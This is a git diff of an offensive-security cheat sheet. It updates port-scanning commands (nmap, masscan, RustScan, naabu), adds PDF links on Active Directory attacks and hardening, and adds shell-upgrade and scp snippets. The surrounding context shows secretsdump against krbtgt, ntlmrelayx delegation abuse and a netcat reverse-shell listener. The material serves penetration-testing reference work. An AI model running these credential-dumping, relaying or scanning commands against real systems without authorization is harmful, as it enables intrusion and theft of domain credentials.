@@ -496,6 +496,7 @@ $ secretsdump.py DC01.megacorp.local -just-dc-user 'MEGACORP\krbtgt' -dc-ip 10.1
 * [https://chryzsh.github.io/relaying-delegation/](https://chryzsh.github.io/relaying-delegation/)
 * [https://habr.com/ru/company/jetinfosystems/blog/449278/](https://habr.com/ru/company/jetinfosystems/blog/449278/)
 * [https://www.exploit-db.com/docs/48282](https://www.exploit-db.com/docs/48282)
+* [[PDF] From Zero Credential to Full Domain Compromise (Haboob Team)](https://mega.nz/file/GsZgwT5I#yFUN0tIourvznZVepA68YF7jeLuB3wxK7nSz1WXucks)
 
 ```
 $ sudo /usr/local/bin/ntlmrelayx.py -t ldaps://DC01.megacorp.local --delegate-access --no-smb-server -wh attacker-wpad --no-da --no-acl --no-validate-privs [-debug]
@@ -588,7 +589,7 @@ PS > Remove-ADIDNSNode -DomainController dc1 -Node pc01 -Credential $cred -Verbo
 * [https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
 * [https://wald0.com/?p=14](https://wald0.com/?p=14)
 * [http://www.offensiveops.io/tools/bloodhound-working-with-results/](http://www.offensiveops.io/tools/bloodhound-working-with-results/)
-* [https://www.varonis.com/blog/powerview-for-penetration-testing/](https://www.varonis.com/blog/powerview-for-penetration-testing/)
+* [[PDF] Pen Testing Active Directory Environments (Varonis)](https://mega.nz/file/CsJEkJCY#tL3QX7ozApOFRK0Ea7EZN9tsyFPxnb4G5CqmCHYugm8)
 
 
 
@@ -2375,7 +2376,7 @@ $ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-servic
 ### Ports (Full)
 
 ```
-$ nmap -Pn -T3 [--min-rate 50000 --min-hostgroup 256] -sV --version-intensity 6 --open -p0-49152 -iL targets.txt -oA services/alltcp-versions
+$ nmap -Pn -T3 [--min-rate 50000 --min-hostgroup 256] -sV --version-intensity 6 -iL targets.txt --open -p1-49152 -oA services/alltcp-versions
 ```
 
 Define which NSE scripts ran:
@@ -2417,7 +2418,7 @@ $ cat nmap/initial.nmap | egrep -o '^[0-9]{1,5}' | awk -F/ '{ print $1 }' ORS=',
 Fast port discovery with Masscan + versions and scripts with Nmap:
 
 ```
-$ sudo masscan --rate 1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > masscan/ports
+$ sudo masscan --rate 3000 -e tun0 -p1-65535,U:0-65535 127.0.0.1 > masscan/ports
 $ ports=`cat masscan/ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
 $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 ```
@@ -2425,7 +2426,7 @@ $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports
 Fast port discovery with Nmap + versions and scripts with Nmap (TCP & UDP):
 
 ```
-$ sudo nmap -n -Pn --min-rate 1000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp.txt
+$ sudo nmap -n -Pn --min-rate 3000 -T4 127.0.0.1 -p- -v --open | tee nmap/ports_tcp.txt
 $ ports_tcp=`cat nmap/ports_tcp | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
 $ sudo nmap -n -Pn -sVC [-sT] [-A] [--reason] -oA nmap/tcp 127.0.0.1 -p$ports_tcp
 
@@ -2442,6 +2443,9 @@ Or
 $ sudo nmap --script-updatedb
 $ cat /usr/share/nmap/scripts/script.db | grep smb
 ```
+
+
+#### Port Scanners
 
 Top TCP ports:
 
@@ -2510,28 +2514,30 @@ Top UDP ports:
 |  623 | IPMI       |
 | 3391 | RD Gateway |
 
+* [https://github.com/robertdavidgraham/masscan](https://github.com/robertdavidgraham/masscan)
+* [https://github.com/RustScan/RustScan/wiki/Usage](https://github.com/RustScan/RustScan/wiki/Usage)
+* [https://github.com/projectdiscovery/naabu](https://github.com/projectdiscovery/naabu)
+
 ```
 $ ports=21,22,23,25,53,80,88,111,135,137,139,389,443,445,593,623,636,873,1090,1098,1099,1433,1521,2049,2222,2375,3268,3269,3306,3389,4444,4445,4786,4848,4990,5432,5555,5556,5900,5985,5986,6066,6379,7000,7001,7002,7003,7004,7070,7071,8000,8001,8002,8003,8080,8088,8383,8443,8500,8686,8880,8888,8983,9000,9001,9002,9003,9012,9200,9389,9503,10999,11099,11111,27017,45000,45001,47001,47002,50500
 
-$ sudo masscan [-e eth0] --rate 500 --open -p$ports -iL hosts.txt --resume paused.conf >> masscan.out
+ # Masscan
+$ sudo masscan [-e eth0] --rate 3000 -iL hosts.txt --open -p$ports --resume paused.conf >> masscan.out
 $ mkdir services && for p in `echo $ports | tr ',' ' '`; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
+
+ # RustScan
+$ sudo rustscan -b 3000 -u 5000 -a hosts.txt -r $ports -g --no-config --scan-order "Random" > rustscan.out
+
+ # Naabu
+$ sudo ./naabu [-interface eth0] -iL hosts.txt -rate 3000 -p - -silent -nmap-cli 'sudo nmap -v -Pn -sVC -O -oA naabutest'
 ```
 
-
-#### Nmap
+##### Nmap
 
 Flag `-A`:
 
 ```
 $ nmap -A ... == nmap -sC -sV -O --traceroute ...
-```
-
-Enum WAF:
-
-```
-$ nmap -sV --script http-waf-detect 127.0.0.1 -p80
-$ nmap -sV --script http-waf-fingerprint 127.0.0.1 -p80
-+ wafw00f.py
 ```
 
 
@@ -4316,6 +4322,42 @@ $ vi ~/.msf4/modules/exploits/linux/http/p.rb
 
 
 
+# Mitigations
+
+
+
+
+## Network
+
+Mitigating ARP spoofing:
+
+* [[PDF] Ruijie Anti-ARP Spoofing Technical White Paper](https://mega.nz/file/KtJkRR4Q#Hmw0d1zeGqzEG4gVNh2a2Bg4-sEV2-bpe8SYrZhGCA4)
+
+
+
+
+## AD
+
+Common vulnerabilities & misconfigurations and recommendations:
+
+* [https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/#2-admincount-attribute-set-on-common-users](https://www.infosecmatter.com/top-16-active-directory-vulnerabilities/#2-admincount-attribute-set-on-common-users)
+* [https://threadreaderapp.com/thread/1369309701050142720.html](https://threadreaderapp.com/thread/1369309701050142720.html)
+* [https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/](https://s3cur3th1ssh1t.github.io/The-most-common-on-premise-vulnerabilities-and-misconfigurations/)
+
+SMB lateral-movement hardening:
+
+* [https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
+* [https://medium.com/palantir/restricting-smb-based-lateral-movement-in-a-windows-environment-ed033b888721](https://medium.com/palantir/restricting-smb-based-lateral-movement-in-a-windows-environment-ed033b888721)
+* [[PDF] SMB Enumeration & Exploitation & Hardening (Anil BAS)](https://mega.nz/file/T5J2DJKA#7fbdSwnuu9uV4PoyIcCwOQJgkv1T9JWHpFCMd9OpfUA)
+
+Antispam protection for Exchange:
+
+* [[PDF] Antispam Forefront Protection 2010 (Exchange Server)](https://mega.nz/file/KoRShD7Z#m4VYdvekzJTmE0eZby-cEA4S0KAWQy6Jpa5qVv21ECs)
+
+
+
+
+
 # NFS
 
 * [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)
@@ -4395,6 +4437,7 @@ $ sudo mount -v -t nfs -o vers=3 -o nolock -o user=snovvcrash,pass='Passw0rd!' 1
 * [https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/](https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/)
 * [https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/)
 * [https://luemmelsec.github.io/Relaying-101/](https://luemmelsec.github.io/Relaying-101/)
+* [[PDF] Lateral Movement using Credentials Relaying (taso_x)](https://mega.nz/file/btIWkDCQ#5LDGfTIgqwoc-gfKst9qcy_wL5bKSALSdzJvC7kKITI)
 
 Generate relay list with cme and enumerate local admins when relaying
 
@@ -5868,6 +5911,7 @@ $ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 
 ```
 $ python -c 'import pty; pty.spawn("/bin/bash")'
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
 Or
 $ script -q /dev/null sh
 
@@ -6398,7 +6442,6 @@ Syncing a forked repository:
 ```
 $ git remote add upstream https://github.com/original/repository.git
 $ git fetch upstream
-
 $ git checkout master
 $ git rebase upstream/master (or git merge upstream/master)
 $ git push -f origin master
@@ -6746,7 +6789,7 @@ $ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/2
 
 
 
-## Utilities
+## Utilities Syntax
 
 
 
@@ -6795,6 +6838,22 @@ Unpack:
 
 ```
 tar -xvjf directory.tar.bz
+```
+
+
+
+### scp
+
+Local file to a remote system:
+
+```
+$ scp file.txt snovvcrash@10.10.13.37:/remote/directory
+```
+
+Remote file to a local system:
+
+```
+$ scp snovvcrash@10.10.13.37:/remote/file.txt /local/directory
 ```
 
 
@@ -7181,6 +7240,19 @@ HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
 
 
 # Web
+
+
+
+
+## WAF
+
+Enum WAF:
+
+```
+$ nmap -sV --script http-waf-detect 127.0.0.1 -p80
+$ nmap -sV --script http-waf-fingerprint 127.0.0.1 -p80
++ wafw00f.py
+```
 
 
 
@@ -7582,6 +7654,8 @@ GitHub:
 
 ```
 $ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
+
+$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words[-lowercase].txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
 ```
 
 
